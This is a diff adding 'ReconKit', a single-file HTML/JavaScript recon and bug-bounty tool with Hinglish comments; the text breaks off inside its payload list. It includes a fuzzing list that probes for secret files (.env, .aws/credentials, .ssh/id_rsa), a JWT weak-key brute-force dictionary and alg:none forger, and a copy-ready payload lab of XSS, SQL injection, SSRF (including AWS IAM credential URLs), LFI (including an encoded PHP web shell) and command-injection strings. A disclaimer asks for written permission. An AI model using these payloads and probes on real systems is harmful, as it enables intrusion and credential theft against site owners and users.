@@ -1,0 +1,2706 @@
+<!--
+  ⚡ ReconKit v1.0 — single-file, client-side Recon & Bug-Bounty Lab
+  ================================================================
+  INTEGRATION (3 tarike):
+   1) Is file ko apni site par /reconkit.html par upload karo, phir kahin bhi:
+        <iframe src="/reconkit.html" style="width:100%;height:900px;border:0" allow="microphone; fullscreen"></iframe>
+   2) Ya file ka pura content apni existing page me paste kar do (self-contained hai).
+   3) Subfolder me bhi chalta hai: /tools/reconkit.html
+  Backend / API keys / external dependencies: ZERO.
+  Kya use hota hai (public keyless APIs): dns.google (DoH), crt.sh (CT), rdap.org + IANA bootstrap (WHOIS),
+  Cymru via DoH + Ripestat (ASN), web.archive.org (history), ip-api/ipinfo/ipapi (geo), public CORS proxies (fetch).
+  ⚠ Sirf un systems par test karo jinke paas tumhara written permission ho.
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ReconKit — All-in-One Recon & Bug Bounty Lab</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%3E%3Ctext%20y='.9em'%20font-size='90'%3E%E2%9A%A1%3C/text%3E%3C/svg%3E">
+<style>
+:root{
+  --bg:#0a0e14; --bg2:#0d1320; --panel:#111826; --panel2:#0e1522; --border:#1e2a3a;
+  --text:#d8e2ee; --muted:#7f8ea3; --accent:#22d3ee; --green:#4ade80; --red:#f87171;
+  --yellow:#fbbf24; --mono:ui-monospace,'Cascadia Code','JetBrains Mono',Consolas,'Courier New',monospace;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:13.5px;line-height:1.55}
+a{color:var(--accent);text-decoration:none} a:hover{text-decoration:underline}
+code{background:var(--bg2);padding:1px 5px;border-radius:4px;font-size:12px}
+.wrap{max-width:1280px;margin:0 auto;padding:18px 16px 60px}
+header.top{display:flex;align-items:center;gap:14px;flex-wrap:wrap;padding:6px 2px 14px}
+.logo{font-size:20px;font-weight:700;color:var(--accent);letter-spacing:.5px}
+.logo span{color:var(--green)}
+.badge{font-size:11px;color:var(--muted);border:1px solid var(--border);border-radius:999px;padding:2px 10px;background:var(--panel2)}
+.disclaimer{font-size:11.5px;color:var(--yellow);background:rgba(251,191,36,.07);border:1px solid rgba(251,191,36,.25);border-radius:8px;padding:8px 12px;margin:0 0 14px}
+.domainbar{display:flex;gap:10px;flex-wrap:wrap;background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:12px;margin-bottom:14px}
+.domainbar input{flex:1;min-width:240px;background:var(--bg2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:10px 12px;font-family:var(--mono);font-size:14px;outline:none}
+.domainbar input:focus{border-color:var(--accent)}
+button{background:linear-gradient(135deg,#0ea5e9,#22d3ee);color:#04121a;border:0;border-radius:8px;padding:10px 16px;font-family:var(--mono);font-weight:700;font-size:13px;cursor:pointer;transition:filter .15s}
+button:hover{filter:brightness(1.12)}
+button:disabled{opacity:.45;cursor:not-allowed}
+button.ghost{background:var(--panel2);color:var(--text);border:1px solid var(--border);font-weight:600}
+button.small{padding:5px 10px;font-size:12px;border-radius:6px}
+button.danger{background:linear-gradient(135deg,#ef4444,#f87171);color:#2a0a0a}
+nav.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px;position:sticky;top:0;background:var(--bg);padding:10px 0;z-index:5}
+nav.tabs button{background:var(--panel2);border:1px solid var(--border);color:var(--muted);font-weight:600}
+nav.tabs button.active{background:linear-gradient(135deg,#0e7490,#155e75);color:#e0f2fe;border-color:#155e75}
+section.pane{display:none}
+section.pane.active{display:block}
+.card{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:14px 16px;margin-bottom:14px}
+.card h3{margin:0 0 10px;font-size:14px;color:var(--accent);display:flex;align-items:center;gap:8px}
+.grid{display:grid;gap:14px;grid-template-columns:repeat(auto-fit,minmax(320px,1fr))}
+.grid .card{margin-bottom:0}
+table{width:100%;border-collapse:collapse;font-size:12.5px}
+th{color:var(--muted);text-align:left;font-weight:600;border-bottom:1px solid var(--border);padding:6px 8px;white-space:nowrap}
+td{padding:6px 8px;border-bottom:1px solid rgba(30,42,58,.55);vertical-align:top;word-break:break-all}
+tr:hover td{background:rgba(34,211,238,.04)}
+.chip{display:inline-block;background:var(--panel2);border:1px solid var(--border);border-radius:999px;padding:2px 10px;margin:2px 4px 2px 0;font-size:12px;color:#a5f3fc;text-decoration:none}
+.chip.warn{color:#fde68a;border-color:rgba(251,191,36,.4)}
+.chip.ok{color:#bbf7d0;border-color:rgba(74,222,128,.4)}
+.chip.bad{color:#fecaca;border-color:rgba(248,113,113,.4)}
+pre{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:10px 12px;overflow:auto;max-height:340px;font-size:12px;white-space:pre-wrap;word-break:break-all;margin:0}
+.score{font-size:34px;font-weight:800}
+.score.good{color:var(--green)} .score.mid{color:var(--yellow)} .score.bad{color:var(--red)}
+.check-row{display:flex;justify-content:space-between;gap:10px;padding:5px 0;border-bottom:1px dashed rgba(30,42,58,.6);font-size:12.5px}
+.check-row .ok{color:var(--green)} .check-row .warn{color:var(--yellow)} .check-row .fail{color:var(--red)}
+.status{font-size:12.5px;color:var(--muted);margin:10px 0;min-height:18px}
+.progress{height:6px;background:var(--bg2);border-radius:999px;overflow:hidden;margin:8px 0;display:none}
+.progress.on{display:block}
+.progress i{display:block;height:100%;width:0%;background:linear-gradient(90deg,#0ea5e9,#4ade80);transition:width .2s}
+.kv{display:grid;grid-template-columns:170px 1fr;gap:4px 12px;font-size:12.5px}
+.kv div:nth-child(odd){color:var(--muted)}
+textarea{width:100%;background:var(--bg2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:10px;font-family:var(--mono);font-size:12.5px;resize:vertical;outline:none}
+textarea:focus{border-color:var(--accent)}
+input[type=text],input:not([type]){background:var(--bg2);border:1px solid var(--border);color:var(--text);border-radius:8px;padding:9px 12px;font-family:var(--mono);font-size:13px;outline:none;width:100%}
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.row .grow{flex:1 1 220px}
+.hint{color:var(--muted);font-size:11.5px}
+.toast{position:fixed;bottom:18px;right:18px;background:var(--panel);border:1px solid var(--accent);border-radius:10px;padding:12px 16px;font-size:12.5px;z-index:99;max-width:340px;box-shadow:0 8px 30px rgba(0,0,0,.5)}
+.toast.err{border-color:var(--red)}
+.toast.hidden{display:none}
+.payload{border:1px solid var(--border);border-radius:8px;margin-bottom:8px;overflow:hidden}
+.payload .head{display:flex;justify-content:space-between;align-items:center;gap:10px;background:var(--panel2);padding:7px 12px;font-size:12.5px;color:#a5f3fc}
+.payload pre{border:0;border-top:1px solid var(--border);max-height:180px;background:var(--bg2)}
+details{margin-bottom:10px}
+details summary{cursor:pointer;color:var(--accent);font-weight:700;padding:8px 0;font-size:13.5px}
+.history-item{border:1px solid var(--border);border-radius:8px;padding:10px 14px;margin-bottom:8px;display:flex;gap:12px;align-items:center;flex-wrap:wrap;cursor:pointer}
+.history-item:hover{border-color:var(--accent)}
+footer{margin-top:30px;color:var(--muted);font-size:11.5px;border-top:1px solid var(--border);padding-top:14px}
+.hidden{display:none}
+.term{background:#05080d;border:1px solid var(--border);border-radius:10px;overflow:hidden;font-size:12.5px;margin-bottom:14px}
+.term-head{background:#111826;padding:8px 14px;display:flex;gap:8px;align-items:center;border-bottom:1px solid var(--border)}
+.term-head .dot{width:10px;height:10px;border-radius:50%}
+.term-head .tt{color:var(--muted);font-size:11.5px;margin-left:8px}
+.term-body{padding:14px;max-height:640px;min-height:120px;overflow:auto;white-space:pre-wrap;word-break:break-all}
+.tblock{margin-bottom:10px;line-height:1.65}
+.tblock.cmd{color:#e2e8f0}
+.tblock.cmd::before{content:"recon@kit:~$ ";color:var(--green);font-weight:700}
+.tblock.out{color:#9fb3c8}
+.tblock.err{color:var(--red)}
+.tblock.ok{color:var(--green)}
+.tblock.info{color:var(--accent)}
+.tblock .code{background:#0d1320;border:1px solid var(--border);border-radius:6px;padding:8px 10px;display:inline-block;margin:4px 0;white-space:pre}
+.tblock h4{color:var(--accent);margin:10px 0 4px;font-size:13px}
+.tblock ul{margin:4px 0 4px 18px;padding:0}
+.term-input-row{display:flex;gap:8px;align-items:center;border-top:1px solid var(--border);padding:9px 14px;background:#0a0f16}
+.term-input-row .prompt{color:var(--green);font-weight:700;white-space:nowrap}
+.term-input-row input{background:transparent;border:0;color:var(--text);font-family:var(--mono);font-size:12.5px;outline:none;flex:1;caret-color:var(--green)}
+</style>
+</head>
+<body>
+<div class="wrap">
+<header class="top">
+  <div class="logo">⚡ Recon<span>Kit</span></div>
+  <span class="badge">v1.0 · 100% client-side · no API keys · single file</span>
+  <span class="badge">recon360 · subs · site-scan · jwt · payloads · tools</span>
+</header>
+<div class="disclaimer">⚠ <b>Legal:</b> sirf un systems par scan/test karo jinke paas tumhara <b>written permission</b> ho. ReconKit requests public keyless APIs (dns.google, crt.sh, rdap.org, web.archive.org) aur target par CORS proxies ke through bhejta hai.</div>
+
+<div class="domainbar">
+  <input id="main-domain" type="text" placeholder="target-domain.com  (e.g. example.com)" autocomplete="off" spellcheck="false">
+  <button id="btn-recon">⚡ Run Recon 360</button>
+  <button id="btn-clear" class="ghost">Clear</button>
+</div>
+
+<nav class="tabs" id="tabs">
+  <button data-tab="recon" class="active">🌐 Recon 360</button>
+  <button data-tab="subs">🔎 Subdomains</button>
+  <button data-tab="site">🕸 Site Scan</button>
+  <button data-tab="jwt">🔑 JWT Lab</button>
+  <button data-tab="payloads">💣 Payloads</button>
+  <button data-tab="tools">🛠 Tools</button>
+  <button data-tab="term">⌨ Terminal</button>
+  <button data-tab="history">📁 History</button>
+</nav>
+
+<section class="pane active" id="pane-recon">
+  <div class="status" id="recon-status">Domain daalo aur <b>Run Recon 360</b> dabao — DNS, WHOIS/RDAP, CT subdomains, ASN, SPF/DMARC/DKIM, Wayback history — sab ek saath.</div>
+  <div class="progress" id="recon-prog"><i></i></div>
+  <div id="recon-out"></div>
+</section>
+
+<section class="pane" id="pane-subs">
+  <div class="card">
+    <h3>🔎 Subdomain Brute (DoH) + Certificate Transparency merge</h3>
+    <div class="row" style="margin-bottom:10px">
+      <input id="sub-domain" type="text" placeholder="domain.com" style="max-width:320px" autocomplete="off">
+      <label class="hint"><input type="checkbox" id="sub-live" checked> auto live-check (first 30)</label>
+      <button id="btn-brute">▶ Brute Force</button>
+      <button id="btn-subs-export" class="ghost small">⬇ CSV</button>
+      <button id="btn-subs-clear" class="ghost small">Clear</button>
+    </div>
+    <div class="hint" style="margin-bottom:6px">Wordlist (space/comma se separated — apne hisaab se edit karo):</div>
+    <textarea id="wordlist" rows="4" spellcheck="false"></textarea>
+  </div>
+  <div class="status" id="subs-status"></div>
+  <div class="progress" id="subs-prog"><i></i></div>
+  <div class="card"><div style="max-height:520px;overflow:auto"><table id="subs-table"></table></div></div>
+</section>
+
+<section class="pane" id="pane-site">
+  <div class="card">
+    <h3>🕸 Site Scan — headers · security score · robots · sitemap · path fuzz · secrets · GMap keys</h3>
+    <div class="row" style="margin-bottom:10px">
+      <input id="site-url" type="text" placeholder="https://domain.com" class="grow" autocomplete="off">
+      <label class="hint"><input type="checkbox" id="verify-gmap" checked> verify GMap keys</label>
+      <label class="hint"><input type="checkbox" id="fast-mode" checked> fast mode (25 paths)</label>
+      <button id="btn-scan">▶ Run Scan</button>
+      <button id="btn-scan-stop" class="danger small" disabled>■ Stop</button>
+    </div>
+    <div class="hint" style="margin-bottom:4px">Custom proxy (optional, <b>full header analysis</b> ke liye): format me <code>{url}</code> rakho — e.g. <code>https://yoursite.com/proxy/?url={url}</code>. Bina proxy ke status/body/tech/robots/fuzz/secrets public CORS proxies se milte hain. README.md me 5-line proxy snippet hai.</div>
+    <input id="custom-proxy" type="text" placeholder="https://yoursite.com/proxy/?url={url}" autocomplete="off" style="margin-top:6px">
+    <div class="hint" style="margin-top:8px">Custom paths (ek line par ek — default list ke saath fuzz honge):</div>
+    <textarea id="extra-paths" rows="3" spellcheck="false" placeholder="/api/v2/users&#10;/admin/config"></textarea>
+  </div>
+  <div class="status" id="site-status"></div>
+  <div class="progress" id="site-prog"><i></i></div>
+  <div id="site-out"></div>
+</section>
+
+<section class="pane" id="pane-jwt">
+  <div class="card">
+    <h3>🔑 JWT Lab — decode · audit · alg:none · weak-key brute · RS/PEM verify · key-confusion</h3>
+    <textarea id="jwt-input" rows="3" spellcheck="false" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"></textarea>
+    <div class="row" style="margin-top:10px">
+      <button id="btn-jwt-decode">🔓 Decode + Audit</button>
+      <button id="btn-jwt-none" class="ghost">⚠ Generate alg:none</button>
+      <button id="btn-jwt-brute" class="ghost">🧨 Brute HS weak keys (~250)</button>
+      <button id="btn-jwt-verify" class="ghost">🛡 Verify (PEM/secret)</button>
+    </div>
+  </div>
+  <div class="card hidden" id="jwt-keycard">
+    <h3>Public Key PEM (RSA) / HMAC secret</h3>
+    <textarea id="jwt-key" rows="4" spellcheck="false" placeholder="-----BEGIN PUBLIC KEY-----&#10;MIIBIjANBg...&#10;-----END PUBLIC KEY-----"></textarea>
+    <div class="hint">RSA public key PEM paste karo to RS* signature verify hogi. HS* token + PEM ho to <b>key-confusion</b> test bhi chalega (public key ko HMAC secret ki tarah). Sirf plain secret paste karo to HMAC check hoga.</div>
+  </div>
+  <div class="status" id="jwt-status"></div>
+  <div id="jwt-out"></div>
+</section>
+
+<section class="pane" id="pane-payloads">
+  <div class="card">
+    <h3>💣 Payload Lab — copy karke use karo</h3>
+    <div class="hint" style="margin-bottom:10px">Curated from PayloadsAllTheThings / swisskyrepo / HackTricks. Hamesha context ke hisaab se use karo; sirf authorized targets par.</div>
+  </div>
+  <div id="payloads-out"></div>
+</section>
+
+<section class="pane" id="pane-tools">
+  <div class="grid">
+    <div class="card">
+      <h3>🧮 CIDR / IP Calculator</h3>
+      <div class="row"><input id="cidr-in" type="text" placeholder="192.168.1.0/24" class="grow"><button id="btn-cidr" class="small">Calc</button></div>
+      <div id="cidr-out" style="margin-top:10px"></div>
+    </div>
+    <div class="card">
+      <h3>🔁 Encoder / Decoder</h3>
+      <textarea id="enc-in" rows="3" spellcheck="false" placeholder="text / base64 / url / hex"></textarea>
+      <div class="row" style="margin-top:8px">
+        <button class="ghost small" data-enc="b64e">B64 enc</button>
+        <button class="ghost small" data-enc="b64d">B64 dec</button>
+        <button class="ghost small" data-enc="ure">URL enc</button>
+        <button class="ghost small" data-enc="urd">URL dec</button>
+        <button class="ghost small" data-enc="he">Hex enc</button>
+        <button class="ghost small" data-enc="hd">Hex dec</button>
+        <button class="ghost small" data-enc="rev">Reverse</button>
+        <button class="ghost small" data-enc="uni">Unicode</button>
+      </div>
+      <pre id="enc-out" class="hidden" style="margin-top:8px"></pre>
+    </div>
+    <div class="card">
+      <h3>#️⃣ Hasher (WebCrypto)</h3>
+      <textarea id="hash-in" rows="3" spellcheck="false" placeholder="text to hash"></textarea>
+      <div class="row" style="margin-top:8px">
+        <button class="ghost small" data-hash="MD5">MD5</button>
+        <button class="ghost small" data-hash="SHA-1">SHA-1</button>
+        <button class="ghost small" data-hash="SHA-256">SHA-256</button>
+        <button class="ghost small" data-hash="SHA-384">SHA-384</button>
+        <button class="ghost small" data-hash="SHA-512">SHA-512</button>
+      </div>
+      <pre id="hash-out" class="hidden" style="margin-top:8px"></pre>
+      <div class="hint" style="margin-top:6px">MD5 + SHA-1 built-in (offline, RFC-verified). SHA-256/384/512 WebCrypto (https context chahiye).</div>
+    </div>
+    <div class="card">
+      <h3>📱 Phone / Network Recon</h3>
+      <div class="hint" style="margin-bottom:8px">Public IP, WebRTC/STUN leak, hostname, secure-context check — mobile bug hunting methodology ke liye. Mic permission briefly maangta hai (audio kahin nahi bheja jata).</div>
+      <button id="btn-phone" class="small">▶ Run Phone Recon</button>
+      <div id="phone-out" style="margin-top:10px"></div>
+    </div>
+  </div>
+</section>
+
+<section class="pane" id="pane-term">
+  <div class="term">
+    <div class="term-head">
+      <span class="dot" style="background:#f87171"></span>
+      <span class="dot" style="background:#fbbf24"></span>
+      <span class="dot" style="background:#4ade80"></span>
+      <span class="tt">ReconKit Shell — data yahan direct dikhega, koi redirect nahi · type <b>help</b></span>
+    </div>
+    <div class="term-body" id="term-body"></div>
+    <div class="term-input-row">
+      <span class="prompt">recon@kit:~$</span>
+      <input id="term-input" type="text" autocomplete="off" spellcheck="false" autofocus>
+    </div>
+  </div>
+</section>
+
+<section class="pane" id="pane-history">
+  <div class="card">
+    <h3>📁 History & Reports</h3>
+    <div class="row" style="margin-bottom:10px">
+      <button id="btn-report-md" class="ghost small">⬇ Full report (Markdown)</button>
+      <button id="btn-report-json" class="ghost small">⬇ Full state (JSON)</button>
+      <button id="btn-hist-clear" class="danger small">🗑 Clear history</button>
+    </div>
+    <div id="hist-list"></div>
+  </div>
+</section>
+
+<footer>
+  <b>ReconKit v1.0</b> — single-file, dependency-free, client-side. Sources: dns.google (DoH) · crt.sh (Certificate Transparency) · rdap.org / IANA bootstrap (WHOIS) · Cymru + Ripestat (ASN) · web.archive.org (history) · ip-api / ipinfo / ipapi (geo) · public CORS proxies (fetch).<br>
+  Integration: <code>reconkit.html</code> apni site par rakh kar <code>&lt;iframe src="/reconkit.html"&gt;</code> se use karo — poore instructions <b>README.md</b> me.
+</footer>
+</div>
+<div id="toast" class="toast hidden"></div>
+<script>
+"use strict";
+/* ================= helpers ================= */
+const $=s=>document.querySelector(s), $$=s=>Array.from(document.querySelectorAll(s));
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+function esc(s){return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+function b64url(s){return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');}
+function b64urlDec(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';return atob(s);}
+function atobBytes(str){const s=atob(str);const b=new Uint8Array(s.length);for(let i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b;}
+function prettyJson(o){try{return esc(JSON.stringify(o,null,2))}catch(e){return esc(String(o))}}
+let toastT=null;
+function toast(msg,err){const el=$('#toast');el.textContent=msg;el.className='toast'+(err?' err':'');clearTimeout(toastT);toastT=setTimeout(()=>el.className='toast hidden',4000);}
+function setProgress(sel,pct){const el=$(sel);el.classList.add('on');el.querySelector('i').style.width=Math.min(100,pct)+'%';}
+function hideProgress(sel){$(sel).classList.remove('on');}
+function card(title,body){return '<div class="card"><h3>'+title+'</h3>'+body+'</div>';}
+function chip(txt,cls){return '<span class="chip '+(cls||'')+'">'+esc(txt)+'</span>';}
+function kv(pairs){return '<div class="kv">'+pairs.map(p=>'<div>'+esc(p[0])+'</div><div>'+p[1]+'</div>').join('')+'</div>';}
+function statusEl(el,msg){el.textContent=msg;}
+function normDom(v){v=(v||'').trim().toLowerCase().replace(/^https?:\/\//,'').replace(/^www\./,'').split(/[\/\?#]/)[0];return v;}
+function download(name,text,type){const b=new Blob([text],{type:type||'text/plain'});const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download=name;document.body.appendChild(a);a.click();a.remove();setTimeout(()=>URL.revokeObjectURL(a.href),5000);}
+function showTab(id){$$('.pane').forEach(p=>p.classList.toggle('active',p.id==='pane-'+id));$$('#tabs button').forEach(b=>b.classList.toggle('active',b.dataset.tab===id));window.scrollTo({top:0});}
+
+/* ================= constants ================= */
+const WORDLIST="www app api api-v2 api2 apiv2 api-dev dev-api v2 v3 dev development staging stage qa test testing beta alpha sandbox demo trial new old old-site site2 site3 web website main home m mobile portal my account accounts login logon signin signup register auth oauth oauth2 sso saml idp identity user users admin administrator panel dashboard console manager mgr control backend front cms wp wp-admin wp-login wordpress shop store shopify ecommerce cart checkout pay payment payments billing invoice invoices order orders subscribe subscription crm erp hr careers jobs job recruit hrms payroll finance fin accounting support help helpdesk helpcenter zendesk intercom hubspot salesforce service servicenow tickets ticket ticketing feedback contact chat livechat mail email smtp pop pop3 imap mx mx1 mx2 mx3 mail1 mail2 webmail exchange outlook owa office o365 sharepoint teams slack drive docs doc document documents wiki knowledge kb faq blog blogs news press media img image images static assets asset cdn cdn1 cdn2 public files file download downloads upload uploads data db database mysql mongo mongodb redis postgres pg sql oracle cache search elastic elasticsearch es kibana log logs logstash log1 monitor monitoring metrics stats statistics analytics tracking pixel event events ping health status uptime pingdom grafana zabbix nagios datadog newrelic sentry splunk prometheus alert vault secrets cert ssl tls vpn proxy proxy1 proxy2 gateway gw lb edge graphql grpc ws websocket socket realtime push notification notifications notify sms webhook webhooks callback partner partners affiliate affiliates reseller vendor vendors supplier integration integrations connector sync backup backups bkp restore archive archives internal intranet private secure restricted staff employee employees student students teacher teachers parent parents admission result results exam exams library hostel canteen transport bus club clubs society societies fest cultural technical sports gym pool auditorium seminar workshop lab labs playground explore learn academy course courses training lms school university campus office2 workplace desk branch branch1 store1 store2 outlet mall market marketplace bazaar retail wholesale agent agents broker brokers dealer dealers franchise referral referrals promo promotions offer offers coupon coupons voucher vouchers discount discounts sale sales deal deals flash giveaway contest contests lottery raffle prize prizes reward rewards loyalty points cashback invite invites share viral buzz social social-media facebook fb twitter instagram ig linkedin li youtube yt tiktok whatsapp wa telegram tg discord zoom meet webex jitsi conference webinar webinars livestream stream streaming video videos audio music sound voice voip sip pbx phone phones call calls jira confluence git gitlab github gitea bitbucket repo repos repository code ci cd jenkins cicd pipeline build builds artifact artifacts nexus sonarqube sonar devops ops k8s kubernetes helm harbor registry docker container aws gcp azure heroku vercel netlify digitalocean linode vultr vps vps1 vps2 vm vm1 vm2 server server1 server2 srv srv1 node node1 host host1 web1 web2 web3 app1 app2 app3 backup-server db-server api-server internal-api admin-internal preview review feature feat experiment exp a-b ab";
+
+const PATHS=["/robots.txt","/sitemap.xml","/sitemap_index.xml","/.well-known/security.txt","/security.txt","/.git/config","/.git/HEAD","/.env","/.env.local","/.env.production","/.DS_Store","/web.config","/.htaccess","/config.php","/configuration.php","/wp-login.php","/wp-admin/","/xmlrpc.php","/admin","/admin/","/administrator","/login","/signin","/api","/api/v1","/api/v2","/api/docs","/api/swagger.json","/swagger.json","/swagger-ui.html","/openapi.json","/graphql","/graphiql","/debug","/trace","/actuator","/actuator/env","/actuator/heapdump","/actuator/mappings","/metrics","/server-status","/console","/console/","/phpmyadmin","/pma","/phpinfo.php","/info.php","/test.php","/install","/installer","/setup","/status","/health","/ping","/version","/changelog","/README","/license","/backup.zip","/db.sql","/database.sql","/dump.sql","/backup/","/old/","/dev/","/staging/","/test/","/new/","/tmp/","/files/","/uploads/","/download/","/docs/","/jenkins","/jira","/confluence","/grafana","/kibana","/prometheus","/nagios","/zabbix","/portainer","/sonarqube","/vault","/webmin","/cpanel","/webmail","/owa","/EWS/Exchange.asmx","/ecp","/autodiscover/autodiscover.xml","/solr","/solr/admin","/airflow","/superset","/jupyter","/notebook","/phpMyAdmin","/adminer","/adminer.php","/crossdomain.xml","/clientaccesspolicy.xml","/.svn/entries","/.hg/","/.aws/credentials","/.ssh/id_rsa","/.netrc","/id_rsa","/.htpasswd"];
+
+const DKIM_SELECTORS=["default","google","k1","k2","s1","s2","mail","mx","dkim","selector1","selector2","protonmail","mandrill","ses","sendgrid","brevo","mailgun","postmark","sel1","sel2","sig1","sig2"];
+
+const JWTDICT="password 123456 12345678 123456789 1234567890 123123 1234 111111 000000 qwerty abc123 monkey letmein admin dragon master 654321 football baseball superman qwerty123 michael shadow 123123456 666666 trustno1 zombie 1q2w3e4r 1q2w3e4r5t abc123456 1234abc 12345a password1 password123 admin123 root toor god save123 secret key jwt secret123 supersecret changeme changeme123 hunter2 secretkey apikey api_key appsecret app_secret client_secret clientsecret private privatekey private_key signing signingkey token tokenseed key123 letmein123 welcome welcome1 hello hello123 qwerty123456 aaaaaaaaaa a123456789 a1234567890 iloveyou123 princess 159753 7777777 8888888 9999999 696969 1qaz2wsx qazwsx q1w2e3r4 asdfgh zxcvbnm zxcvbn 123qwe qwe123 asd123 1q2w3e 555555 333333 444444 222222 112233 135790 13579 987654321 99999999 789456123 0123456789 abcdefg abcdefgh 12345678910 102030 11223344 1122334455 1qazxsw2 qazwsx123 1234567 zxcvbnm123 123456789a a1b2c3d4 121212 131313 212121 123321 999888 123456654321 qwertyuiop 123456q 1234561 q1w2e3 123123a a12345 54321 abcabc 11111111 22222222 33333333 44444444 55555555 66666666 88888888 1qaz2wsx3edc password1! admin@123 root@123 test test123 testing sample demo demo123 example mysecret my_secret supersecret123 topsecret classified confidential internal 2020 2021 2022 2023 2024 2025 2026 open sesame sesame magic wizard dragonfly sunshine flower summer winter mondays fridays coffee tea water fire planet star moon sun sky blue red green black white yellow orange purple pink silver gold diamond ruby pearl opal crystal treasure treasure123 goldmine starlight moonlight happy happy123 lucky lucky123 smile angel angel123 devil demon ghost spirit soul mind brain heart love lover darling sweetheart honey sugar sweet sweetie cute beautiful pretty amazing awesome fantastic incredible wonderful brilliant genius genius123 smart smarty clever witty";
+const JWTDICT_ARR=JWTDICT.split(' ');
+/* ================= payload lab ================= */
+const PAYLOADS=[
+{cat:"XSS",items:[
+["Basic script","<script>alert(1)<\/script>"],
+["Broken attribute + script","\"><script>alert(document.domain)<\/script>"],
+["img onerror","<img src=x onerror=alert(1)>"],
+["svg onload","<svg/onload=alert(1)>"],
+["iframe javascript","<iframe src=\"javascript:alert(1)\"><\/iframe>"],
+["body onload","<body onload=alert(1)>"],
+["details ontoggle","<details open ontoggle=alert(1)>x</details>"],
+["input autofocus","<input onfocus=alert(1) autofocus>"],
+["pointerover","<div onpointerover=alert(1)>hover</div>"],
+["Nested obfuscation","<scr<script>ipt>alert(1)<\/scr<\/script>ipt>"],
+["HTML entities","&#60;script&#62;alert(1)&#60;/script&#62;"],
+["URL encoded","%3Cscript%3Ealert(1)%3C/script%3E"],
+["href javascript","<a href=\"javas&#x66;cript:alert(1)\">click</a>"],
+["fromCharCode","<img src=x onerror=alert(String.fromCharCode(88,83,83))>"],
+["Attribute escape","' onfocus=alert(1) autofocus="],
+["marquee onstart","<marquee onstart=alert(1)>x</marquee>"],
+["object data","<object data=\"javascript:alert(1)\"></object>"],
+["video onerror","<video src=x onerror=alert(1)>"]
+]},
+{cat:"SQL Injection",items:[
+["Bool OR (single quote)","' OR '1'='1"],
+["Bool OR (double quote)","\" OR \"\"=\""],
+["Commented out","1' OR 1=1--"],
+["ORDER BY column count","1' ORDER BY 1,2,3,4,5,6,7,8,9,10--"],
+["UNION NULLs","1' UNION SELECT NULL,NULL,NULL--"],
+["UNION information_schema","1' UNION SELECT table_name,NULL,1 FROM information_schema.tables--"],
+["UNION user/db/version","1' UNION SELECT user(),database(),version()--"],
+["Time blind (MySQL)","1' AND SLEEP(5)--"],
+["Time blind (MSSQL)","1; WAITFOR DELAY '0:0:5'--"],
+["Boolean blind true","1' AND 1=1--"],
+["Boolean blind false","1' AND 1=2--"],
+["Stacked query","1; SELECT 1--"],
+["MSSQL convert error","1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))"],
+["Alt quote concat","'||'1'='1"],
+["Comment obfuscation","1/**/UNION/**/SELECT/**/1,2,3--"],
+["Tab/newline obfusc","1%09OR%091=1"],
+["URL encoded","1%27%20OR%201=1--"]
+]},
+{cat:"SSRF",items:[
+["Loopback IPv4","http://127.0.0.1"],
+["Loopback IPv4 alt","http://127.0.0.1:80"],
+["IPv6 loopback","http://[::1]"],
+["Zero form","http://0"],
+["Decimal","http://2130706433"],
+["Hex octets","http://0x7f.0x0.0x1"],
+["Octal","http://0177.0.0.1"],
+["Short form","http://127.1"],
+["Hostname","http://localhost"],
+["AWS metadata","http://169.254.169.254/latest/meta-data/"],
+["AWS IAM creds","http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
+["GCP metadata","http://100.100.100.200/latest/meta-data/"],
+["File protocol","file:///etc/passwd"],
+["Gopher Redis","gopher://127.0.0.1:6379/_INFO"],
+["Dict protocol","dict://127.0.0.1:6379/info"],
+["SSH probe","http://127.0.0.1:22"],
+["MySQL probe","http://127.0.0.1:3306"],
+["Internal hostname","http://internal.company.local"],
+["Decimal big","http://134744072"],
+["DNS rebind (example)","http://127.0.0.1.nip.io"]
+]},
+{cat:"LFI / Path Traversal",items:[
+["Basic traversal","../../etc/passwd"],
+["Dot-slash evasion","....//....//....//etc/passwd"],
+["URL encoded","%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"],
+["Partial encode","..%2f..%2f..%2fetc/passwd"],
+["Double encode","..%252f..%252f..%252fetc/passwd"],
+["Backslash (Windows)","..\\..\\..\\..\\windows\\win.ini"],
+["file wrapper","file:///etc/passwd"],
+["PHP filter base64","php://filter/read=convert.base64-encode/resource=index.php"],
+["PHP filter config","php://filter/convert.base64-encode/resource=config.php"],
+["data wrapper php","data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"],
+["phar wrapper","phar:///var/www/uploads/shell.phar"],
+["Null byte","../../../../etc/passwd%00.jpg"],
+["proc environ","/proc/self/environ"],
+["proc cmdline","/proc/self/cmdline"],
+["Hostname read","....//....//....//....//....//etc/hostname"],
+["UNC path","\\\\server\\share"]
+]},
+{cat:"Command Injection",items:[
+["Semicolon","; ls"],
+["Pipe","| ls"],
+["Ampersand","& ls"],
